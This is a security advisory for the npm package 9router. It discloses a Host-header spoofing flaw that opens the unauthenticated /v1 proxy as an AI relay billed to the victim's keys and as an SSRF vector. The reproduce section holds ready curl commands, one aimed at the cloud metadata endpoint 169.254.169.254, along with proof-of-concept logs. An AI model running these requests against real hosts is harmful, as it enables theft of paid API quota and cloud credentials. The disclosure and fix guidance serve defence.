# [H] 9router: Unauthenticated `/v1` proxy access via `Host`-header spoofing → open AI relay + SSRF

## Summary
Severity: High
Advisory: GHSA-86m2-fcxq-5q7c
CVE: CVE-2026-55641
CWE: CWE-1327, CWE-290, CWE-348, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-86m2-fcxq-5q7c
Type: github-advisory

## Affected
- npm: `9router` — affected >=0 <0.5.2

## Details
## Summary

9router's request guard decides a request is "local" (and therefore exempt from API-key auth on the `/v1` LLM proxy) by reading the **client-controlled `Host` header**. Because 9router binds `0.0.0.0` by default (and the CLI misleadingly prints "localhost"), a remote, unauthenticated attacker who can reach the port can send `Host: localhost` to be treated as local and obtain `/v1` proxy access with **no API key, no CLI token, and no dashboard login**. In the default configuration (`requireApiKey` is absent from `DEFAULT_SETTINGS`, so the handler-side key check is skipped), this yields:

- **Open AI relay** — the proxy forwards the attacker's requests to AI providers using the **victim's stored paid API keys** (cost/quota theft, prompt-based data exfiltration through the victim's accounts).
- **Unauthenticated SSRF** — `/v1/search` with the built-in `noAuth` `searxng` provider takes its outbound fetch URL from the request body (`provider_options.baseUrl`), so the attacker drives a server-side fetch to any internal/cloud-metadata host and gets the JSON response reflected back.

- **Affected:** `9router <= 0.4.80` (current), `src/dashboardGuard.js` (`isLocalRequest`), `src/sse/handlers/{chat,search}.js`, `src/lib/db/repos/settingsRepo.js`, `cli/cli.js`.
- **Distinct from** the existing advisories GHSA-fhh6-4qxv-rpqj (MCP-plugin RCE, patched) and GHSA-xrrh-p7f2-27vm (legacy `<0.3.75` authz bypass).

## Details

### The bypass (`src/dashboardGuard.js`)
```js
function isLoopbackHostname(h){ const name=h.split(":")[0].replace(/^\[|\]$/g,"").toLowerCase();
  return new Set(["localhost","127.0.0.1","::1"]).has(name); }
function isLocalRequest(request){
  if (!isLoopbackHostname(request.headers.get("host"))) return false;   // <-- client-controlled Host
  const origin = request.headers.get("origin");
  if (origin){ try { if (!isLoopbackHostname(new URL(origin).hostname)) return false; } catch { return false; } }
  return true;
}
async function canAccessPublicLlmApi(request){
  if (isLocalRequest(request)) return true;     // <-- "local" => no key required
  if (await hasValidCliToken(request)) return true;
  return await hasValidApiKey(request);
}
```
`isLocalRequest` never consults the **socket peer address** — only the spoofable `Host` header (and an absent/loopback `Origin`). The `/v1`,`/v1beta`,`/api/v1`,`/api/v1beta` prefixes are gated solely by `canAccessPublicLlmApi`.

### Default exposure
- `cli/cli.js:63` `const DEFAULT_HOST = "0.0.0.0";` and `Dockerfile` `ENV HOSTNAME=0.0.0.0` / `EXPOSE 20128` → reachable from the network by default.
- `cli/cli.js:500,541` display `"localhost"` even when bound to `0.0.0.0` — operators believe it's local-only.
- `src/lib/db/repos/settingsRepo.js` `DEFAULT_SETTINGS` has **no `requireApiKey`** → the handler key checks (`chat.js` `if (settings.requireApiKey)`, `search.js` same) are skipped by default.

### Relay chain (verbatim trace, 0.4.71)
middleware (`src/proxy.js`, matcher covers all paths) → `canAccessPublicLlmApi` true via spoofed Host → `next.config.mjs` rewrites `/v1/:path*`→`/api/v1/:path*` → `src/app/api/v1/messages/route.js` POST → `handleChat` (no independent auth) → only gate falsy `requireApiKey` → `getProviderCredentials()` loads the victim's stored credentials → `handleChatCore` outbound fetch → response returned. **No downstream key gate.**

### SSRF chain
`search.js` (only gate falsy `requireApiKey`) → `searxng` `noAuth:true` ⇒ `handleSearchCore({credentials:null})` → `coreBody.provider_options = body.provider_options` → `callers.js`:
```js
export function resolveBaseUrl(config, params){
  const override = getProviderSetting(params, "baseUrl");   // reads params.providerOptions.baseUrl FIRST
  return (override || config.baseUrl).replace(/\/+$/, "");
}
```
→ `buildSearxngRequest` appends `/search?q=...&format=json&categories=general` → `fetch(url)` (server-side) → JSON reflected to caller.

## PoC

Ground-truth, no network egress: `harness/hostspoof.mjs` (verbatim guard logic) and `harness/ssrf_search.mjs` (imports the *real* `handleSearchCore` + `AI_PROVIDERS.searxng`).

**Guard bypass (`hostspoof.mjs`, exit 2):**
```
attacker: remote, NO api key, NO cli token. Want canAccessPublicLlmApi === true == BYPASS
   denied       honest remote (real Host)
*** ALLOWED ***  SPOOF Host: localhost (no Origin)
*** ALLOWED ***  SPOOF Host: 127.0.0.1
*** ALLOWED ***  SPOOF Host: localhost:20128
   denied       SPOOF Host + Origin evil (blocked)
RESULT: BYPASS — remote key-less attacker spoofing Host: localhost is granted /v1 proxy access.
```

**SSRF (`ssrf_search.mjs`, real imported code):**
```
[*] searxng configured baseUrl: http://localhost:8888/search
[*] attacker provider_options.baseUrl: http://127.0.0.1:<port>
[*] credentials passed to core: null (noAuth => key-less attacker)
internal service reached by 9router process: true
path hit: /search?q=x&format=json&categories=general
data returned to attacker: [{"title":"INTERNAL-DATA",...,"content":"leaked"...}]
SSRF CONFIRMED: key-less request drove a server-side fetch to attacker URL.
```

### Live confirmation against a RUNNING 9router (real HTTP, not just source/harness)

Built & ran `9router@0.4.71` (Next.js 16.2.9, bound `0.0.0.0:20128`, **default settings, no provider configured, no api key/login**). Attacker = a request to the box's **non-loopback LAN IP `10.204.111.34`** (a genuine remote peer); only the `Host` header differs between the control and the attack:

```
(A) honest Host (the IP):     POST /v1/search  Host: 10.204.111.34:20128
    => HTTP 401 {"error":"API key required for remote API access"}      [guard blocks remote]

(B) spoofed Host: localhost:  POST /v1/search  Host: localhost
       body: {"provider":"searxng","query":"x","provider_options":{"baseUrl":"http://127.0.0.1:19099"}}
    => HTTP 200, and the attacker's listener logged:
       [ATTACKER-LISTENER] 9router CONNECTED: GET /search?q=x&format=json&categories=general | from 127.0.0.1
    => the 9router SERVER PROCESS issued a GET to the attacker-controlled URL  = unauthenticated SSRF.

(B') relay path POST /v1/messages, same Host-spoof:
       honest Host => 401 ;  Host: localhost => 404 {"error":"No active credentials for provider: openai"}
    => bypass reached handleChat's provider selection (would forward on the VICTIM'S key if one were configured).
```
Changing **only** the `Host` header (401 → reaches the handler), from the same remote peer, is the entire bypass — confirmed live on a default-config running instance. (Full SSRF response *reflection* requires the upstream to return searxng-shaped JSON; otherwise it is a blind/semi-blind SSRF — the server-side request to the attacker URL is the proven primitive. The relay needs ≥1 configured provider — the normal state — to actually spend the victim's key.) See `repro/LIVE-EVIDENCE.txt`.

**Reproduce** (against a network-reachable 9router; `VICTIM_IP` = the box):
```bash
# Open AI relay — no Authorization/x-api-key/cookie; victim's key pays:
curl -sS http://VICTIM_IP:20128/v1/messages -H 'Host: localhost' -H 'Content-Type: application/json' \
  -d '{"model":"claude-3-5-sonnet-20241022","max_tokens":64,"messages":[{"role":"user","content":"relay test"}]}'

# SSRF — attacker-controlled server-side fetch (e.g. cloud metadata), JSON reflected:
curl -sS http://VICTIM_IP:20128/v1/search -H 'Host: localhost' -H 'Content-Type: application/json' \
  -d '{"provider":"searxng","query":"x","provider_options":{"baseUrl":"http://169.254.169.254/latest/meta-data"}}'
```

## Impact

Any 9router reachable on a network (default `0.0.0.0` bind, plus Docker `-p`, tunnel, or tailscale — all first-class features) can be:
- used as a free AI relay billed to the victim's provider accounts, exhausting quota and exfiltrating data through their keys; and
- used to reach internal services / cloud metadata (`169.254.169.254`) with the response reflected to the attacker.
Unauthenticated, no user interaction, default configuration. The only precondition is the normal one (≥1 configured provider).

## Recommended fix
1. Determine "local" from the **socket peer IP**, never the `Host` header — treat as local only if the TCP peer is `127.0.0.0/8` / `::1`.
2. Bind `127.0.0.1` by default; require an explicit, warned opt-in for `0.0.0.0`; fix the CLI to not print "localhost" when bound to all interfaces.
3. For any non-loopback peer, require a valid API key regardless of `requireApiKey`; add `requireApiKey: true` to `DEFAULT_SETTINGS` (fail-closed).
4. Validate `provider_options.baseUrl` against an allowlist (or drop the override) and block requests to private/link-local ranges in `resolveBaseUrl`.
5. Remove `Access-Control-Allow-Origin: *` from `/v1` GET metadata routes.

## References
- https://github.com/decolua/9router/security/advisories/GHSA-86m2-fcxq-5q7c
- https://nvd.nist.gov/vuln/detail/CVE-2026-55641
- https://github.com/decolua/9router/commit/b282f0554972ea35281520738759d76abcd0b0b3
- https://github.com/decolua/9router
- https://github.com/decolua/9router/releases/tag/v0.5.2
